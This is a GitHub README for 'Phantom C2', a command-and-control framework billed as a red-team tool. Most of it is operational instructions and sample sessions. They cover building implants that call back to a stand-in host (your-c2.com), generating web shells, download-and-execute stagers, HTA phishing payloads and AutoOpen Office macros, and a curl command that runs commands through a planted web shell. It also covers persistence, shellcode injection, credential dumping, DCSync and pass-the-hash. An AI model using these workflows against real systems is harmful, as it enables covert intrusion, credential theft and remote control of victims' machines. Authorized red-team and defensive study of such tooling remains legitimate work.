# Phantom C2

```
    ___  __  __   ___   _  __ ______ ____   __  ___
   / _ \/ / / /  / _ | / |/ //_  __// __ \ /  |/  /
  / ___/ /_/ /  / __ |/    /  / /  / /_/ // /|_/ /
 /_/   \____/  /_/ |_/_/|_/  /_/   \____//_/  /_/

  [::] Phantom C2 Framework — Red Team Operations
```

<p align="center">
  <strong>A modern Command & Control framework for authorized red team engagements</strong>
</p>

<p align="center">
  <a href="#features">Features</a> |
  <a href="#installation">Installation</a> |
  <a href="#usage">Usage</a> |
  <a href="#agent-capabilities">Agent Capabilities</a> |
  <a href="#payload-generation">Payloads</a> |
  <a href="#disclaimer">Disclaimer</a>
</p>

---

## Screenshots

### Server Startup
![Startup](docs/assets/screenshot-startup.png)

### Agent Management
![Agents](docs/assets/screenshot-agents.png)

### Agent Interaction & Shell
![Interact](docs/assets/screenshot-interact.png)

### Active Directory Commands
![AD Commands](docs/assets/screenshot-ad-commands.png)

### Payload Generation
![Generate](docs/assets/screenshot-generate.png)

### Command Reference
![Help](docs/assets/screenshot-help.png)

---

## Features

- **CLI-first interface** — styled command shell like Sliver/Metasploit with colored output, ASCII tables, and real-time event notifications
- **Cross-platform** — server runs on Windows and Linux; agents target Windows and Linux
- **Encrypted communications** — RSA-2048 key exchange + AES-256-GCM session encryption
- **Malleable profiles** — disguise C2 traffic as Microsoft 365, Cloudflare, or custom API traffic
- **In-memory execution** — BOF loader (COFF parser on Windows, memfd on Linux), shellcode injection, process injection — zero disk footprint
- **22 Active Directory commands** — enumeration, Kerberoasting, AS-REP roast, DCSync, lateral movement, credential dumping
- **8 payload types** — ASPX/PHP/JSP web shells, PowerShell/Bash/Python stagers, HTA and VBA macros
- **Agent builder** — cross-compile agents directly from the CLI with embedded encryption keys and optional garble obfuscation
- **SQLite database** — persistent storage for agents, tasks, results, and loot

---

## Installation

### Linux (Kali / Ubuntu / Debian)

```bash
# Step 1: Install Go (if not already installed)
sudo apt update
sudo apt install -y golang-go git make

# Verify Go version (1.22+ required)
go version

# Step 2: Clone the repository
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom

# Step 3: Install dependencies
go mod tidy

# Step 4: (Optional) Install garble for agent obfuscation
go install mvdan.cc/garble@latest

# Step 5: Generate RSA keypair (required for encrypted comms)
go run ./cmd/keygen -out configs/

# Step 6: (Optional) Generate TLS certificates for HTTPS listeners
bash scripts/generate_certs.sh

# Step 7: Build the server
make server

# Step 8: Start Phantom
./build/phantom-server --config configs/server.yaml
```

### Windows

```powershell
# Step 1: Install Go
# Download from https://go.dev/dl/ and run the installer
# Or use winget:
winget install GoLang.Go

# Restart your terminal after installing Go, then verify:
go version

# Step 2: Install Git (if not already installed)
winget install Git.Git

# Step 3: Clone the repository
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom

# Step 4: Install dependencies
go mod tidy

# Step 5: (Optional) Install garble for agent obfuscation
go install mvdan.cc/garble@latest

# Step 6: Generate RSA keypair
go run ./cmd/keygen -out configs/

# Step 7: Build the server
go build -ldflags "-s -w" -o build\phantom-server.exe ./cmd/server

# Step 8: Start Phantom
.\build\phantom-server.exe --config configs\server.yaml
```

### Quick Install (One-liner)

**Linux:**
```bash
git clone https://github.com/Phantom-C2-77/Phantom.git && cd Phantom && go mod tidy && go run ./cmd/keygen -out configs/ && make server && ./build/phantom-server --config configs/server.yaml
```

**Windows (PowerShell):**
```powershell
git clone https://github.com/Phantom-C2-77/Phantom.git; cd Phantom; go mod tidy; go run ./cmd/keygen -out configs/; go build -ldflags "-s -w" -o build\phantom-server.exe ./cmd/server; .\build\phantom-server.exe --config configs\server.yaml
```

---

## Usage

### Starting the Server

```bash
./build/phantom-server --config configs/server.yaml
```

You will see:

```
    ___  __  __   ___   _  __ ______ ____   __  ___
   / _ \/ / / /  / _ | / |/ //_  __// __ \ /  |/  /
  / ___/ /_/ /  / __ |/    /  / /  / /_/ // /|_/ /
 /_/   \____/  /_/ |_/_/|_/  /_/   \____//_/  /_/

  [::] Phantom C2 Framework — Red Team Operations
  [::] Version: dev

  [*] Loading configuration from configs/server.yaml
  [*] Initializing server...
  [+] Listener 'fallback-http' started on 0.0.0.0:8080 (http)
  [+] Phantom C2 server ready
  [*] Type 'help' for available commands

  phantom >
```

### Global Commands

```
  phantom > help

  Phantom C2 — Commands
  ─────────────────────────────────────────

  agents                         List all connected agents
  interact <name|id>             Interact with an agent
  listeners [start|stop] <name>  Manage listeners
  tasks [agent]                  View task history
  generate <type> [url]          Build agent or generate payload
  remove <name|id>               Remove a dead agent
  loot [agent]                   View captured loot
  events                         View event log
  clear                          Clear screen
  help                           Show this help
  exit                           Shutdown and exit
```

### Interacting with Agents

```
  phantom > agents
  ┌──────────┬───────────────┬─────────┬──────────┬───────┬─────────────┬──────────┬──────────┬────────┐
  │    ID    │     Name      │   OS    │ Hostname │ User  │     IP      │  Sleep   │ Last Seen│ Status │
  ├──────────┼───────────────┼─────────┼──────────┼───────┼─────────────┼──────────┼──────────┼────────┤
  │ a3f2e8c1 │ silent-falcon │ windows │ DC-PROD  │ admin │ 10.0.1.42   │ 10s/20%  │ 2s ago   │ active │
  │ b7d4f091 │ dark-raven    │ linux   │ web-01   │ root  │ 10.0.1.100  │ 10s/20%  │ 5s ago   │ active │
  └──────────┴───────────────┴─────────┴──────────┴───────┴─────────────┴──────────┴──────────┴────────┘

  phantom > interact silent-falcon
  [+] Interacting with silent-falcon (admin@DC-PROD)

  phantom [silent-falcon] > shell whoami
  [+] Task queued (ID: a3f2e8c1) — waiting for agent check-in...
  [+] Result:
      dc-prod\admin

  phantom [silent-falcon] > ad-help
  (shows all 22 AD commands)

  phantom [silent-falcon] > ad-enum-users
  phantom [silent-falcon] > ad-kerberoast
  phantom [silent-falcon] > screenshot
  phantom [silent-falcon] > persist registry
  phantom [silent-falcon] > back
```

### Agent Commands (inside `interact` session)

| Command | Description |
|---------|-------------|
| `shell <command>` | Execute shell command (cmd.exe / /bin/sh) |
| `upload <local> <remote>` | Upload file to agent |
| `download <remote>` | Download file from agent |
| `screenshot` | Capture screenshot |
| `ps` | List running processes |
| `sysinfo` | Get system information |
| `persist <method>` | Install persistence (registry/schtask/cron/service/bashrc) |
| `sleep <sec> [jitter%]` | Change sleep interval |
| `cd <path>` | Change working directory |
| `bof <file> [args]` | Execute Beacon Object File (in-memory) |
| `shellcode <file>` | Execute raw shellcode in-memory |
| `inject <pid> <file>` | Inject shellcode into remote process |
| `ad-*` | Active Directory commands (type `ad-help`) |
| `kill` | Terminate the agent |
| `info` | Show agent details |
| `tasks` | Show task history |
| `back` | Return to main menu |

---

## Agent Capabilities

| Capability | Windows | Linux |
|-----------|---------|-------|
| Shell Execution | cmd.exe | /bin/sh |
| File Upload/Download | Yes | Yes |
| Screenshot | PowerShell GDI | import/scrot/xwd |
| Process List | tasklist | ps aux |
| System Info | Full | Full |
| Persistence | Registry Run Key, Scheduled Task | Cron, Systemd Service, .bashrc |
| BOF Execution | In-memory COFF loader | memfd_create |
| Shellcode Execution | VirtualAlloc + CreateThread | mmap RWX |
| Process Injection | CreateRemoteThread | N/A |
| Sandbox Detection | Yes | Yes |

### Active Directory Commands (22 total)

**Enumeration:** `ad-enum-domain`, `ad-enum-users`, `ad-enum-groups`, `ad-enum-computers`, `ad-enum-shares`, `ad-enum-spns`, `ad-enum-gpo`, `ad-enum-trusts`, `ad-enum-admins`, `ad-enum-asrep`, `ad-enum-delegation`, `ad-enum-laps`

**Attacks:** `ad-kerberoast`, `ad-asreproast`, `ad-dcsync`

**Credential Access:** `ad-dump-sam`, `ad-dump-lsa`, `ad-dump-tickets`

**Lateral Movement:** `ad-psexec`, `ad-wmi`, `ad-winrm`, `ad-pass-the-hash`

---

## Building Agents

### From the Phantom CLI

```
phantom > generate exe https://your-c2.com:443
[*] Building windows/amd64 agent...
[+] Agent built successfully!
  Output:      build/agents/phantom-agent_windows_amd64.exe
  Size:        6.4 MB
  Platform:    windows/amd64
  Listener:    https://your-c2.com:443
  Sleep:       10s / 20%
```

### From Make

```bash
# Windows agent
make agent-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Linux agent
make agent-linux LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Obfuscated (garble)
make agent-garble-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
```

---

## Payload Generation

### From the Phantom CLI

```
phantom > generate aspx https://your-c2.com:443
[+] Payload generated: build/payloads/update.aspx
[*] Upload to target web server, then access with:
  curl -X POST -H 'X-Debug-Token: <token>' -d 'data=whoami' <url>

phantom > generate php https://your-c2.com:443
phantom > generate jsp https://your-c2.com:443
phantom > generate powershell https://your-c2.com:443
phantom > generate bash https://your-c2.com:443
phantom > generate python https://your-c2.com:443
phantom > generate hta https://your-c2.com:443
phantom > generate vba https://your-c2.com:443
```

| Payload | Platform | Description |
|---------|----------|-------------|
| `aspx` | IIS/ASP.NET | Token-protected web shell with 404 decoy |
| `php` | Apache/Nginx | Multi-fallback execution (5 methods) |
| `jsp` | Tomcat/Java | Cross-platform web shell |
| `powershell` | Windows | Download & execute stager |
| `bash` | Linux | curl/wget stager |
| `python` | Cross-platform | SSL-capable stager |
| `hta` | Windows | Phishing payload (base64 PS cradle) |
| `vba` | Windows | Office macro (AutoOpen) |

---

## Configuration

### Server Config (configs/server.yaml)

```yaml
server:
  database: "data/phantom.db"
  rsa_private_key: "configs/server.key"
  rsa_public_key: "configs/server.pub"
  default_sleep: 10
  default_jitter: 20

listeners:
  - name: "default-https"
    type: "https"
    bind: "0.0.0.0:443"
    profile: "default"
    tls_cert: "configs/server.crt"
    tls_key: "configs/server-tls.key"

  - name: "fallback-http"
    type: "http"
    bind: "0.0.0.0:8080"
    profile: "default"
```

### Malleable Profiles

Three built-in profiles in `configs/profiles/`:

- **default.yaml** — Generic API traffic (`/api/v1/status`)
- **microsoft.yaml** — Microsoft 365/Azure (`/common/oauth2/v2.0/token`)
- **cloudflare.yaml** — Cloudflare Workers (`/cdn-cgi/rum`)

---

## Project Structure

```
phantom/
  cmd/
    server/          Server entrypoint
    agent/           Agent entrypoint
    keygen/          RSA keypair generator
  internal/
    server/          Core server logic + config
    listener/        HTTP/HTTPS listeners + malleable profiles
    agent/           Agent manager + builder
    task/            Task dispatcher + queues
    crypto/          RSA-2048, AES-256-GCM, key exchange
    protocol/        Wire protocol + msgpack serialization
    db/              SQLite database + repositories
    cli/             CLI shell, banner, tables
    implant/         Agent-side code (shell, file, screenshot, persist, AD, BOF)
    payloads/        Payload generator (web shells, stagers, macros)
    util/            Shared utilities
  configs/           Server config + malleable profiles
  scripts/           Helper scripts (certs, etc.)
  docs/              Documentation
```

---

## Disclaimer

**This tool is designed for authorized red team engagements and security research only.**

Unauthorized access to computer systems is illegal. You are responsible for ensuring you have proper authorization before using this tool. The author accepts no liability for misuse.

Always:
- Obtain written authorization before testing
- Follow your organization's rules of engagement
- Document all activities
- Report findings responsibly

## Author

**Opeyemi Kolawole** - [GitHub](https://github.com/Phantom-C2-77) | ckkolawole77@gmail.com

## License

BSD 3-Clause License - see [LICENSE](LICENSE) for details.
